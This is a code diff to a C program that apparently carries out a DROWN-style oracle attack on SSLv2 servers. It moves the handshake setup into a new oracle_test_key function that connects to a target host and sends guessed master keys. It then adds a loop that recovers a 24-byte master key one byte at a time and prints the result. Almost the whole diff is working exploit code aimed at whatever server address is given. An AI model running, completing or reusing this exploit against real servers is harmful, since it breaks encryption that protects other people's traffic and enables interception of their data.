@@ -312,7 +312,73 @@ int recv_server_verify(SSL *ssl)
 	return result;
 }
 
-int guess_master_key(SSL* ssl, unsigned char *res)
+/*
+ * Establish a conection to the server,
+ * send a clientHello handshake
+ * and the guessed key
+ */
+SSL* oracle_test_key(char *hostaddress,
+			unsigned char *master_key,
+			unsigned int clear_bytes,
+			unsigned char *encrypted_key,
+			unsigned int encrypted_key_length)
+{
+	int res;
+
+	const SSL_METHOD *method = SSLv2_method();
+	assert(method != NULL);
+
+	// Get context
+	SSL_CTX *ctx = SSL_CTX_new(method);
+	assert(ctx != NULL);
+
+	// Get a new SSL object
+	SSL *ssl = SSL_new(ctx);
+	assert(ssl != NULL);
+
+	// Connect to SSL server
+	BIO *server = BIO_new_connect(hostaddress);
+	assert(server != NULL);
+
+	res = BIO_do_connect(server);
+	assert(res == 1);
+
+	// Connect SSL with BIO
+	SSL_set_bio(ssl, server, server);
+
+	// Make a new SSL session
+	// We have to do everything by hand
+	ssl_get_new_session(ssl, 0);
+
+	// Set cipers for the session
+	// Suppose key len is 24 bytes
+	// Found these by using 'openssl ciphers -v -ssl2'
+	SSL_set_cipher_list(ssl, "DES-CBC3-MD5");
+
+	// Init socket buffer
+	ssl->init_buf = BUF_MEM_new();
+	BUF_MEM_grow(ssl->init_buf, SSL2_MAX_RECORD_LENGTH_3_BYTE_HEADER);
+
+	// Start TLS handshake
+	send_client_hello(ssl);
+	if (!recv_server_hello(ssl))
+	{
+		printf("Cipher list is not supported\n");
+		return -1;
+	}
+
+	printf("Sending master key guess...\n");
+	send_master_key_guess(ssl, master_key, clear_bytes, encrypted_key, 256);
+	printf("Master key guess sent!\n");
+	ssl->s2->clear_text=0;
+    assert(ssl2_enc_init(ssl, 1) == 1);
+	ssl2_read_from_socket(ssl);
+	printf("Reading done\n");
+	
+	return ssl;
+}
+
+int guess_master_key_byte(SSL* ssl, unsigned char *res)
 {
 	// guess the last byte
     for(int c = 0; c < 256; c++)
@@ -342,51 +408,6 @@ int main(int argc, char **argv)
 	SSL_library_init();
 	SSL_load_error_strings();
 
-	const SSL_METHOD *method = SSLv2_method();
-	assert(method != NULL);
-
-	// Get context
-	SSL_CTX *ctx = SSL_CTX_new(method);
-	assert(ctx != NULL);
-
-	// Get a new SSL object
-	SSL *ssl = SSL_new(ctx);
-	assert(ssl != NULL);
-
-	// Connect to SSL server
-	BIO *server = BIO_new_connect(argv[1]);
-	assert(server != NULL);
-
-	res = BIO_do_connect(server);
-	assert(res == 1);
-
-	// Connect SSL with BIO
-	SSL_set_bio(ssl, server, server);
-
-	// Make a new SSL session
-	// We have to do everything by hand
-	ssl_get_new_session(ssl, 0);
-
-	// Set cipers for the session
-	// Suppose key len is 16 bytes
-	// Found these by using 'openssl ciphers -v -ssl2'
-	// SSL_set_cipher_list(ssl, "IDEA-CBC-MD5:RC2-CBC-MD5:RC4-MD5");
-	SSL_set_cipher_list(ssl, "DES-CBC3-MD5");
-
-	// Init socket buffer
-	ssl->init_buf = BUF_MEM_new();
-	BUF_MEM_grow(ssl->init_buf, SSL2_MAX_RECORD_LENGTH_3_BYTE_HEADER);
-
-	// Start TLS handshake
-	send_client_hello(ssl);
-	if (!recv_server_hello(ssl))
-	{
-		printf("Cipher list is not supported\n");
-		return -1;
-	}
-
-	// TODO add master key guess here
-	// Needs encrypted key data in order to work
 	// Master-Key: 38C5BB48DF4CE118A04F246B6F01BB48732F5D752A2AE894
 	// unsigned char encrypted_key[256] = "\x5d\x8e\x44\xf7\x7b\x99\xd3\xa8\xbb\x28\x5c\x2e\x31\x4a\x4e\xf9" \
 	// 									"\x55\xe5\x1a\xc3\x2b\xb3\x01\x0e\x26\x3b\x21\x07\x05\xce\x07\x45" \
@@ -425,29 +446,31 @@ int main(int argc, char **argv)
 
 	unsigned char keysize = 24;
 	unsigned char guess_array[keysize*2];
-    memset(guess_array, 0, keysize*2);
+    memset(guess_array, 0, keysize*2); // Array full of zeroes, we guess the bytes one by one
     unsigned char *master_key_guess = guess_array;
 
-	printf("Sending master key guess...\n");
-	send_master_key_guess(ssl, master_key_guess, keysize - 1, encrypted_key, 256);
-	printf("Master key guess sent!\n");
-	ssl->s2->clear_text=0;
-    assert(ssl2_enc_init(ssl, 1) == 1);
-	ssl2_read_from_socket(ssl);
-	printf("Reading done\n");
+	for(int current_byte = keysize - 1; current_byte >= 0; current_byte--) {
+		// Establish connection
+		SSL *ssl = oracle_test_key(argv[1], ++master_key_guess, current_byte, encrypted_key, 256);
+		// Get last byte
+		printf("Guessing master key byte %d...\n", current_byte);
+		res = guess_master_key_byte(ssl, &master_key_guess[keysize - 1]);
+		printf("Done guessing! res = %d\n", res);
 
-	// Get last byte
-	printf("Guessing master key...\n");
-	res = guess_master_key(ssl, &master_key_guess[keysize - 1]);
-	printf("Done guessing! res = %d\n", res);
+		if(!res)
+		{
+			return 0;
+		}
 
-	if(!res)
-	{
-		return 0;
+		SSL_CTX_free(ssl->ctx);
+		SSL_free(ssl);
 	}
-
-	SSL_CTX_free(ssl->ctx);
-	SSL_free(ssl);
+	
+	printf("Guessed key is: ");
+	for(int i = 0; i < keysize; i++) {
+		printf("%02X", master_key_guess[i]);
+	}
+	printf("\n");
 
 	return 0;
 }
